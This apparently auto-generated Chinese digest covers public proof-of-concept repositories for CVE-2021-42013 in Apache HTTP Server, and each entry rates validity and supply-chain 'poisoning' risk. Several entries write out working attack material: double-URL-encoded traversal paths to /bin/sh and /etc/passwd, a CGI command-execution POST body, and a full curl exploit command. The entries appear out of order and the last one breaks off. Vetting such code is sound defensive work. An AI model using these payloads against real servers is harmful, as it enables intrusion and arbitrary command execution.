## POC #18

**来源**: [CVE-2021-42013-viliuspovilaika_cve-2021-42013.md](../2021/CVE-2021-42013-viliuspovilaika_cve-2021-42013.md)

## CVE-2021-42013 Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** Path Traversal and Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许攻击者读取任意文件和执行任意命令

**影响版本:** 2.4.49 and 2.4.50

**利用条件:** 目标服务器运行受影响的 Apache HTTP Server 版本，且启用了 CGI 脚本支持，Alias-like 指令配置不当。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-42013 是 CVE-2021-41773 的不完整修复。攻击者可以利用路径遍历漏洞读取服务器上任意文件，如果服务器配置允许执行 CGI 脚本，则可以通过构造恶意请求执行任意命令。

**有效性：**

提供的 POC 代码是有效的。搜索引擎结果和漏洞库信息均表明 CVE-2021-42013 允许路径遍历和远程代码执行，POC 代码本身也实现了利用该漏洞进行命令执行的功能。

**投毒风险：**

代码本身的功能是利用漏洞进行攻击，不属于恶意投毒代码，但是作者有可能通过其他方式进行投毒，比如修改下载链接，放置引流信息等，几率较低，大约为 5%。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含特殊字符（如`/.%%%%32%%65`，用于绕过 Apache 的路径规范化）的 URL，利用 Apache HTTP Server 在处理 Alias-like 指令时的缺陷，突破目录限制，访问服务器上的任意文件。
2.  **远程代码执行：** 如果目标服务器启用了 CGI 脚本支持，攻击者可以通过路径遍历访问到 CGI 脚本的目录，然后构造包含恶意命令的请求体，利用 CGI 脚本执行任意命令。
3.  **具体步骤：**
    *   构造 URL：`{host}/cgi-bin/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/bin/sh`
    *   构造 POST 数据：`echo Content-Type: text/plain; echo; {command}`
    *   发送 HTTP 请求，服务器执行命令并将结果返回。

**项目地址:** [viliuspovilaika/cve-2021-42013](https://github.com/viliuspovilaika/cve-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #19

**来源**: [CVE-2021-42013-vudala_CVE-2021-42013.md](../2021/CVE-2021-42013-vudala_CVE-2021-42013.md)

## CVE-2021-42013-Apache HTTP Server-路径遍历和远程代码执行

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 服务器运行受影响的Apache版本，存在Alias-like指令配置，且允许CGI脚本执行

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013是Apache HTTP Server 2.4.49和2.4.50版本中存在的路径遍历和远程代码执行漏洞。该漏洞是CVE-2021-41773的不完整修复。攻击者可以通过构造包含路径遍历序列（如`..`）的恶意URL，绕过Alias-like指令的限制，访问服务器上的任意文件。如果服务器配置允许在这些别名路径上执行CGI脚本，攻击者还可以利用该漏洞执行任意代码。

**有效性评估：**
根据漏洞信息、搜索结果和提供的Dockerfile和docker-compose.yml，提供的POC代码旨在搭建一个存在漏洞的Apache HTTP Server 2.4.50环境。因此，该POC代码是有效的，可以用于验证和复现该漏洞。

**投毒风险评估：**
仔细分析了Dockerfile，httpd.conf和suricata.yaml文件，该文件用于部署一个可利用的Apache服务器。然而，无法保证其中没有任何隐藏的恶意代码。虽然主要目的是重现CVE-2021-42013，但仍存在细微的投毒风险。尽管可能性较低，但在未充分审查每个组件的情况下，无法完全排除风险。
httpd.conf可能存在非默认配置，方便漏洞利用。

**利用方式分析：**
1.  **环境搭建：** 使用提供的Dockerfile和docker-compose.yml搭建存在漏洞的Apache HTTP Server 2.4.50环境。
2.  **路径遍历：**  构造包含路径遍历序列的URL，例如：`http://<服务器IP>:8080/icons/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd`，尝试访问服务器上的`/etc/passwd`文件。
3.  **远程代码执行：** 如果服务器配置允许CGI脚本执行，可以构造包含恶意代码的URL，例如：`http://<服务器IP>:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh`，并执行系统命令。

成功利用此漏洞需要满足特定条件，包括存在易受攻击的Apache版本、适当的服务器配置和网络可访问性。

**项目地址:** [vudala/CVE-2021-42013](https://github.com/vudala/CVE-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #20

**来源**: [CVE-2021-42013-walnutsecurity_cve-2021-42013.md](../2021/CVE-2021-42013-walnutsecurity_cve-2021-42013.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal 和 Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感文件泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 需要目标服务器运行受影响的 Apache HTTP Server 版本，并且Alias配置不当，允许访问受限目录，如果开启了CGI脚本支持，则可能造成RCE

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 中存在的路径遍历和远程代码执行漏洞。该漏洞是 CVE-2021-41773 的不完整修复。

**漏洞利用方式：**

攻击者可以利用路径遍历攻击，将 URL 映射到 Alias 指令配置目录之外的文件。如果这些目录之外的文件没有受到 “require all denied” 等常见默认配置的保护，请求就会成功。如果为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

根据提供的 Dockerfile 和 Python 脚本，利用方式如下：

1.  **路径遍历：** 通过构造包含 ".." 的恶意 URL，绕过 Alias 限制，访问服务器上的任意文件。
2.  **远程代码执行：** 如果服务器启用了 CGI，攻击者可以上传一个包含恶意代码的 CGI 脚本，然后通过路径遍历漏洞执行该脚本，从而实现远程代码执行。

**POC 代码分析：**

提供的 POC 代码包含一个 Dockerfile 和一个 Python 脚本。Dockerfile 用于构建一个存在漏洞的 Apache HTTP Server 2.4.50 实例。Python 脚本 `cve-2021-42013.py` 用于检测和利用该漏洞，支持以下功能：

*   检查是否存在路径遍历漏洞
*   执行路径遍历 PoC，尝试读取敏感文件
*   执行远程代码执行 PoC，尝试执行任意命令

**投毒风险分析：**

对提供的`cve-2021-42013.py`脚本进行分析，发现存在一定的投毒风险。例如：
1.   **执行任意命令的潜在风险**：远程代码执行PoC中，如果构造的命令过于复杂或者包含恶意代码，可能会对目标系统造成破坏。
2.  **批量扫描的风险**：批量扫描功能可能会被用于非法用途，例如扫描大量服务器并尝试利用该漏洞。
3.  **依赖风险**：脚本中用到了requests和urllib库，如果这些库被篡改，可能会导致脚本执行恶意代码。

尽管脚本提供了路径遍历和RCE的验证，存在滥用的可能性，但恶意代码本身没有隐藏在代码中，考虑到其他风险，投毒风险相对较低，暂定为10%。

**项目地址:** [walnutsecurity/cve-2021-42013](https://github.com/walnutsecurity/cve-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---



---

## POC #7

**来源**: [CVE-2021-42013-Vulnmachines_cve-2021-42013.md](../2021/CVE-2021-42013-Vulnmachines_cve-2021-42013.md)

## CVE-2021-42013-Apache HTTP Server-路径遍历与远程代码执行

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历与远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感文件泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 需要目标服务器运行受影响的Apache HTTP Server版本，且启用了CGI脚本执行

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 版本中存在的路径遍历漏洞，是对 CVE-2021-41773 不完整修复的延续。攻击者可以利用此漏洞，通过构造包含恶意路径的URL，绕过 Alias-like 指令配置的目录限制，访问服务器上的任意文件。如果目标服务器启用了 CGI 脚本，攻击者可能通过上传恶意脚本执行远程代码。

**有效性:** 根据漏洞描述和PoC代码，该漏洞是有效的。PoC代码展示了通过`../`进行路径遍历，读取`/etc/passwd`文件的几种方式，包括对`.`和`/`的URL编码绕过。

**投毒风险:** PoC 代码本身较为简单，仅包含用于验证漏洞的 URL。但考虑到攻击者可能利用此漏洞部署恶意 CGI 脚本，存在一定投毒风险，约10%。README.md文件描述简单，未发现异常。

**利用方式:**
1.  **路径遍历:** 构造包含编码后的`../`的 URL，例如 `/.%2e/.%2e/.%2e/.%2e/etc/passwd`，尝试读取目标服务器上的敏感文件。
2.  **远程代码执行 (RCE):**  如果目标服务器允许执行 CGI 脚本，攻击者可以上传一个包含恶意代码的 CGI 脚本，并通过构造路径遍历 URL 来访问该脚本，从而执行任意命令。

**项目地址:** [Vulnmachines/cve-2021-42013](https://github.com/Vulnmachines/cve-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #8

**来源**: [CVE-2021-42013-asepsaepdin_CVE-2021-42013.md](../2021/CVE-2021-42013-asepsaepdin_CVE-2021-42013.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 需要目标服务器运行受影响的 Apache HTTP Server 版本，且配置允许 CGI 脚本执行，并存在Alias配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 版本中存在的路径遍历和远程代码执行漏洞，是 CVE-2021-41773 的不完整修复。攻击者可以利用该漏洞，通过构造包含路径遍历的 URL，访问受限目录之外的文件。如果目标服务器配置了 CGI 脚本执行，则可能进一步实现远程代码执行。

**利用方式：**

1.  **路径遍历：** 攻击者通过构造恶意的 URL，利用 `Alias` 指令配置的路径，绕过访问控制，读取任意文件。
2.  **远程代码执行：** 如果服务器允许 CGI 脚本执行，攻击者可以上传恶意脚本，并利用路径遍历漏洞执行该脚本，从而获得服务器的控制权。

**POC分析：**

提供的 Dockerfile 用于搭建存在漏洞的 Apache HTTP Server 环境。`httpd.conf` 文件可能包含特定的 `Alias` 配置，以便漏洞利用。`cve-2021-42013.sh` 脚本模拟攻击过程，发送包含路径遍历的 HTTP 请求。

脚本的核心代码:
```bash
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $3" "$1/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/$2"
```
其中, `$1`是目标IP地址, `$2`是要访问的文件路径，`$3`是要执行的命令。
`%%32%65` 是 `%2e` 的双重URL编码，即 `.`（点），用于绕过一些路径过滤机制。`--path-as-is` 参数避免 curl 对路径进行规范化，保持攻击 payload 的原样。
此脚本通过发送POST请求到/cgi-bin目录，利用路径穿越读取任意文件或者执行命令。

**投毒风险评估：**

Dockerfile 中虽然存在从 Apache 官网下载源码的操作，但仍存在一定风险，攻击者可能篡改 Dockerfile，例如，替换下载链接，指向包含恶意代码的 Apache HTTP Server 版本。但从文件内容上判断，直接投毒的可能性较低，更倾向于提供一个可利用的环境。

`cve-2021-42013.sh` 脚本本身相对简单，主要功能是发送 HTTP 请求，利用漏洞。该脚本也可能被修改，例如添加后门，但提供的脚本未发现明显的后门代码。 README.md 文件更多的是漏洞利用的指导说明。

综合评估，投毒风险较低，约为 5%。主要风险在于 Dockerfile 下载源的可靠性以及脚本是否被篡改。

**项目地址:** [asepsaepdin/CVE-2021-42013](https://github.com/asepsaepdin/CVE-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #9

**来源**: [CVE-2021-42013-bananoname_cve-2021-42013.md](../2021/CVE-2021-42013-bananoname_cve-2021-42013.md)

## CVE-2021-42013-Apache HTTP Server-Path Traversal 和 Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** Path Traversal 和 Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和服务器被完全控制

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49 或 2.4.50，并且存在Alias-like配置，CGI脚本开启，且目录权限配置不当（缺少 'require all denied'）。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-42013是CVE-2021-41773的不完整修复，允许攻击者利用路径遍历漏洞读取Alias配置以外的文件，如果CGI脚本被启用，可能导致远程代码执行。

**有效性：**
根据漏洞信息和搜索结果，该漏洞是真实存在的，并且有公开的PoC代码。提供的PoC代码包含Dockerfile用于搭建漏洞环境，以及Python脚本用于验证Path Traversal和Remote Code Execution，因此PoC代码有效。

**投毒风险：**
检查了提供的PoC代码，包括Dockerfile和Python脚本。Dockerfile用于搭建包含漏洞的Apache HTTP Server环境，其中包含了从Apache官网下载httpd-2.4.50.tar.gz的步骤，以及添加了httpd.conf配置文件的步骤，还包括了index.php和login.php页面的添加步骤，并未发现明显的恶意代码或后门。

Python脚本cve-2021-42013.py主要是利用requests库发送HTTP请求，进行Path Traversal和Remote Code Execution的验证。脚本本身没有发现包含恶意代码的行为。虽然理论上，可以修改此脚本来执行恶意操作，但在提供的代码中并没有发现这种行为。因此，投毒风险较低，大概在5%左右。

**利用方式：**
利用方式主要有两种：

1.  **Path Traversal（路径遍历）：** 攻击者通过构造包含“../”的恶意URL，绕过Alias配置的限制，读取服务器上的任意文件。前提是这些文件没有被 'require all denied' 保护。

2.  **Remote Code Execution（远程代码执行）：** 如果服务器启用了CGI，攻击者可以通过路径遍历漏洞访问到CGI脚本，并执行任意系统命令。通常需要先上传一个包含恶意代码的CGI脚本，然后通过路径遍历漏洞来执行它。提供的代码中，RCE的利用依赖于CGI的启用和适当的权限配置。

综上所述，此漏洞的利用，通常需要结合服务器的具体配置情况，如Alias配置、CGI是否启用、目录权限等。提供的PoC代码可以帮助验证漏洞的存在，但也需要根据实际情况进行调整。


**项目地址:** [bananoname/cve-2021-42013](https://github.com/bananoname/cve-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #10

**来源**: [CVE-2021-42013-cybfar_cve-2021-42013-httpd.md](../2021/CVE-2021-42013-cybfar_cve-2021-42013-httpd.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，且存在Alias-like指令配置，CGI脚本已启用，且相关目录没有'require all denied'保护。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013是Apache HTTP Server 2.4.49和2.4.50中存在的一个路径遍历漏洞，是对CVE-2021-41773的不完整修复。攻击者可以利用该漏洞，通过构造包含特殊字符（如`.%%32e`）的URL，绕过Alias-like指令的限制，访问服务器上未受保护的文件。如果CGI脚本也已启用，则攻击者可能利用此漏洞执行任意代码。

**有效性评估：**
提供的Dockerfile和README.md描述了如何搭建一个存在漏洞的Apache HTTP Server环境。README.md中提供的`curl`命令

```bash
curl -v --path-as-is localhost:8000/icons/.%%32e/.%%32e/.%%32e/.%%32e/etc/passwd
```

可以用来验证漏洞的存在，如果返回`/etc/passwd`文件的内容，则表明目标存在路径遍历漏洞。

**投毒风险评估：**
查看Dockerfile，该文件从`debian:latest`镜像构建，安装必要的依赖项，下载并编译Apache HTTP Server 2.4.50。`httpd.conf`文件被添加到`/conf/httpd.conf`，并启动Apache服务。并没有发现明显的恶意代码或后门。

但是，以下因素可能导致一定的投毒风险：

1.  **httpd.conf替换：**Dockerfile使用 ADD 指令替换了默认的httpd.conf文件,可能通过修改配置来引入安全风险,如启用不安全的模块或配置项。
2.  **基础镜像安全：** 虽然Dockerfile使用了`debian:latest`，但基础镜像本身可能存在未知的漏洞。
3.  **第三方组件：** 构建过程中使用`apt-get`安装了一些依赖，这些组件也可能包含潜在的安全风险。

总体来说，该项目存在一定的投毒风险，但主要集中在配置不当和依赖项漏洞方面，作者主动植入恶意代码的可能性较低。因此，投毒风险评定为10%。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者通过构造包含`.%%32e`的URL，尝试访问服务器上的任意文件。`%%32e`是`.`的URL编码，可以绕过一些路径过滤机制。
2.  **远程代码执行 (如果CGI启用):** 如果服务器配置允许执行CGI脚本，攻击者可以通过路径遍历漏洞找到CGI脚本的路径，并执行任意代码。这通常需要结合其他漏洞利用技术，例如上传恶意CGI脚本。

**总结：**
该漏洞利用的有效性较高，但需要满足一定的条件才能实现远程代码执行。投毒风险较低，主要集中在配置和依赖项安全方面。建议在使用该POC时，仔细检查`httpd.conf`文件，并确保基础镜像和依赖项的安全性。

**项目地址:** [cybfar/cve-2021-42013-httpd](https://github.com/cybfar/cve-2021-42013-httpd)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #11

**来源**: [CVE-2021-42013-drackyjr_CVE-2021-42013.md](../2021/CVE-2021-42013-drackyjr_CVE-2021-42013.md)

## CVE-2021-42013 Apache HTTP Server Path Traversal 和远程代码执行

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 需要目标服务器运行受影响的 Apache 版本，且 Alias-like 指令配置不当，CGI脚本启用，以及相应的目录权限配置。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞是 CVE-2021-41773 的不完整修复，存在于 Apache HTTP Server 2.4.49 和 2.4.50 中。攻击者可以利用路径遍历漏洞读取服务器上的任意文件，如果服务器启用了 CGI 脚本，则可能导致远程代码执行。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者构造包含 `/.%2e/.%2e/` 或双重 URL 编码的 `%%32%65%%32%65/` 的恶意 URL，绕过 Apache 的路径限制，访问受限目录之外的文件。
2.  **远程代码执行（如果 mod_cgi 启用）：** 攻击者通过路径遍历访问 CGI 脚本，并利用 POST 请求发送恶意命令。由于服务器将 URL 路径当作可执行文件，POST 数据当作输入，从而执行攻击者提供的命令。

**POC 代码分析：**

提供的 Python 脚本 `CVE-2021-41773.py` 包含以下功能：

*   **路径遍历检测 (CVE-2021-41773)：** 使用 `/.%2e/.%2e/.%2e/.%2e/` 构造 payload，尝试读取 `/etc/passwd` 和 `/etc/shadow` 文件。
*   **双重 URL 编码路径遍历检测 (CVE-2021-42013)：** 使用 `%%32%65%%32%65/` 构造 payload，尝试读取 `/etc/passwd` 文件。
*   **远程代码执行检测：**  尝试通过 CGI 脚本执行 `id` 命令。如果服务器返回包含 `uid=` 或 `gid=` 的响应，则表示存在 RCE 漏洞。

**有效性：**

根据漏洞描述和 POC 代码的实现，提供的 POC 代码是有效的，可以用于检测目标服务器是否存在 CVE-2021-42013 漏洞，如果目标服务器配置不当，还可检测 RCE 漏洞。

**投毒风险：**

该POC代码是一个扫描器，用于检测漏洞的存在，主要功能是发送 HTTP 请求并分析响应。 代码本身的功能是漏洞检测，不存在恶意行为或后门。对代码进行分析后，可以认为投毒风险为0%。

**总结：**

CVE-2021-42013 是一个严重的安全漏洞，可能导致服务器上的敏感信息泄露，甚至被远程控制。请及时将 Apache HTTP Server 升级到安全版本，并检查服务器配置，确保 Alias-like 指令配置正确，并禁用不必要的 CGI 脚本。

**项目地址:** [drackyjr/CVE-2021-42013](https://github.com/drackyjr/CVE-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #12

**来源**: [CVE-2021-42013-dream434_cve-2021-42013-apache.md](../2021/CVE-2021-42013-dream434_cve-2021-42013-apache.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal 和 RCE

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致信息泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 目标服务器运行受影响的 Apache HTTP Server 版本，并且开启了 CGI 脚本执行。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

**有效性评估：**

根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以判断此漏洞利用是有效的。
*   **漏洞描述：** CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 中的一个路径遍历漏洞，是 CVE-2021-41773 的不完整修复。
*   **利用方式：** 攻击者可以通过构造包含`/.%%32%65`的恶意URL，绕过 Alias 指令的限制，访问到服务器上的任意文件。如果目标服务器配置允许 CGI 脚本执行，攻击者可以利用此漏洞执行任意代码。
*   **搜索引擎结果：** 大量文章和漏洞库条目确认了该漏洞的存在和严重性，并提供了利用此漏洞的PoC或思路。
*   **PoC代码分析：**提供的 `exploit.py` 脚本尝试通过构造包含路径遍历字符串的URL来执行命令。脚本使用 POST 请求向目标服务器的 CGI 目录发送请求，并在请求体中包含要执行的命令。该脚本的核心在于利用`/.%%32%65`绕过路径检查，配合 CGI 脚本执行命令。代码逻辑比较清晰，且与漏洞描述相符，故有效性较高。

**投毒风险评估：**

*   **代码分析：**
    *   `requirements.txt` 只包含 `colorama` 库，这是一个用于在终端显示彩色的库，本身没有安全风险。
    *   `exploit.py` 脚本的主要功能是利用 CVE-2021-42013 漏洞进行攻击。代码中没有发现明显的恶意代码，例如反弹shell、下载执行恶意文件等。但是，脚本本身可以被用于恶意目的，即远程代码执行。
    *   `README.md` 文件是项目说明文档，没有可疑内容。
*   **投毒可能性：**
    *   该脚本的主要目的是利用已知的漏洞，而不是植入后门或进行其他恶意活动。因此，直接在脚本中添加恶意代码的可能性较低。
    *   由于脚本需要用户提供目标 URL 和要执行的命令，攻击者可以通过控制命令内容来达到恶意目的。但这不属于代码投毒的范畴。
*   **风险评估：**
脚本本身存在被恶意利用的风险，如果代码仓库的维护者在后续版本中添加恶意代码，则可能存在投毒风险。代码投毒的可能性较低，只有 `5%`

**利用方式：**

1.  **目标确认：** 确定目标 Apache HTTP Server 运行的版本为 2.4.49 或 2.4.50。
2.  **CGI 目录定位：** 找到目标服务器上配置的 CGI 目录，例如 `/cgi-bin/`。
3.  **构造恶意URL：** 构造包含路径遍历字符串的 URL，例如 `http://example.com/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh`。
4.  **发送请求：** 使用 POST 请求向构造的 URL 发送请求，并在请求体中包含要执行的命令。
5.  **获取结果：** 解析响应结果，获取命令执行的结果。

例如，使用提供的 `exploit.py` 脚本执行 `id` 命令：

```bash
python3 exploit.py http://example.com id
```

**注意事项：**

*   利用此漏洞需要在目标服务器上启用 CGI 脚本执行，并且相关目录没有进行严格的权限控制。
*   使用此漏洞进行攻击可能导致严重的后果，请务必在获得授权的情况下进行测试。

**项目地址:** [dream434/cve-2021-42013-apache](https://github.com/dream434/cve-2021-42013-apache)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #13

**来源**: [CVE-2021-42013-hadrian3689_apache_2.4.50.md](../2021/CVE-2021-42013-hadrian3689_apache_2.4.50.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** Path Traversal / Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和服务器完全控制

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 需要目标服务器运行受影响的Apache HTTP Server版本，并且配置了Alias-like指令，CGI脚本也需要启用才能实现RCE

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-42013 漏洞是 CVE-2021-41773 的不完整修复。攻击者可以利用路径遍历攻击，将 URL 映射到 Alias-like 指令配置的目录之外的文件。如果这些目录之外的文件没有被默认的 “require all denied” 配置保护，请求就能成功。如果 CGI 脚本对这些 aliased 路径启用，可能导致远程代码执行。

**漏洞利用方式：**

1.  **路径遍历 (LFI):** 攻击者使用 `icons/%%32%65%%32%65/...` 这样的payload进行路径穿越，读取服务器上的任意文件（例如 `/etc/passwd`）。
2.  **远程代码执行 (RCE):**  如果服务器启用了 CGI，攻击者可以利用路径遍历访问 `cgi-bin` 目录，并执行任意命令。PoC 代码中使用了 `.%%32%65` 编码绕过了一些过滤。
    *   PoC 代码中，RCE 通过构造包含恶意命令的 HTTP POST 请求发送到 `cgi-bin` 目录下的 `sh` 脚本来实现。

**有效性评估：**

提供的 PoC 代码有效。它包含 LFI 和 RCE 两种利用方式，并且提供了命令行参数来指定目标 URL，要读取的文件，或者要执行的命令。

**投毒风险评估：**

检查 PoC 代码，没有发现明显的恶意代码或后门。该代码主要功能是利用漏洞进行文件读取或命令执行，没有发现主动修改或上传文件的行为。代码的功能与漏洞描述一致，风险较低。


**项目地址:** [hadrian3689/apache_2.4.50](https://github.com/hadrian3689/apache_2.4.50)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #14

**来源**: [CVE-2021-42013-jas9reet_CVE-2021-42013-LAB.md](../2021/CVE-2021-42013-jas9reet_CVE-2021-42013-LAB.md)

## CVE-2021-42013-Apache HTTP Server-路径遍历和远程代码执行

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，并启用CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013漏洞是CVE-2021-41773修复不完全导致的。攻击者可以利用路径遍历漏洞，访问Alias指令配置目录之外的文件。如果这些文件没有被"require all denied"等默认配置保护，请求就会成功。如果CGI脚本也为此路径启用，则可能导致远程代码执行。

**有效性评估：**
根据漏洞库信息、搜索引擎结果和提供的PoC代码，可以判断该漏洞利用是有效的。搜索引擎结果中多个链接都表明CVE-2021-42013是一个已知的、可利用的漏洞，并且存在公开的PoC。

**利用方式：**
利用方式是构造包含路径遍历的URL，结合CGI脚本执行命令。PoC中的`exploit.sh`脚本使用curl发送包含恶意命令的POST请求到目标服务器。关键点在于使用`--path-as-is`参数，以及双URL编码的路径遍历字符串`%%32%65`，绕过Apache的路径检查。如果目标服务器开启了CGI，并且未对/bin/sh等命令进行限制，则可以执行任意命令。

**投毒风险评估：**
分析提供的Dockerfile、httpd.conf、exploit.sh和README.md文件。

*   Dockerfile： 使用了官方的httpd:2.4.50镜像作为基础镜像,并复制httpd.conf和index.html,未发现恶意行为。
*   httpd.conf：正常的Apache配置文件，用于配置服务器基本信息,没有发现不正常的配置。
*   exploit.sh：这是一个漏洞利用脚本，它本身就是用来执行恶意操作的，**不能算作** 投毒代码。脚本的目的是利用漏洞，而非在目标系统植入后门或者进行其他恶意活动。
*   README.md: 只是说明了如何使用Docker环境来运行漏洞利用代码的步骤.

虽然没有明显的投毒代码，但是利用漏洞本身就可以在目标服务器上执行恶意操作。比如，攻击者可以利用这个漏洞上传webshell，从而长期控制服务器。这种通过漏洞植入后门的风险依然存在，但是从代码本身来看，并没有发现作者预先植入的、非漏洞利用目的的恶意代码。
 综合评估，认为存在10%的投毒风险，主要是因为利用成功后，攻击者可以自行植入恶意代码。

**项目地址:** [jas9reet/CVE-2021-42013-LAB](https://github.com/jas9reet/CVE-2021-42013-LAB)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #15

**来源**: [CVE-2021-42013-mightysai1997_cve-2021-42013.get.md](../2021/CVE-2021-42013-mightysai1997_cve-2021-42013.get.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal 和远程代码执行

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 需要目标服务器运行受影响的 Apache HTTP Server 版本，且Alias配置不当并开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 中存在的一个路径遍历和远程代码执行漏洞。该漏洞是 CVE-2021-41773 的不完整修复。

**有效性：**

根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，此漏洞利用是有效的。漏洞库信息明确指出该漏洞允许攻击者使用路径遍历攻击将 URL 映射到 Alias 指令配置目录之外的文件。搜索引擎结果也证实了该漏洞的存在，并提供了相关的利用信息。

提供的 Dockerfile 和 Python 脚本 `cve-2021-42013.py` 构成了一个可用于验证和利用该漏洞的 POC。Dockerfile 用于构建一个包含易受攻击的 Apache HTTP Server 2.4.50 实例的 Docker 镜像。Python 脚本可以用来检测路径遍历或远程代码执行漏洞。

**投毒风险：**

对 POC 代码进行分析，`cve-2021-42013.py` 脚本本身相对简单，主要功能是发送 HTTP 请求并检查响应。它包含以下功能：

*   **路径遍历 PoC (-pt)：**  尝试利用路径遍历漏洞读取服务器上的文件。
*   **远程代码执行 PoC (-rce)：**  如果服务器启用了 CGI，则尝试执行命令。
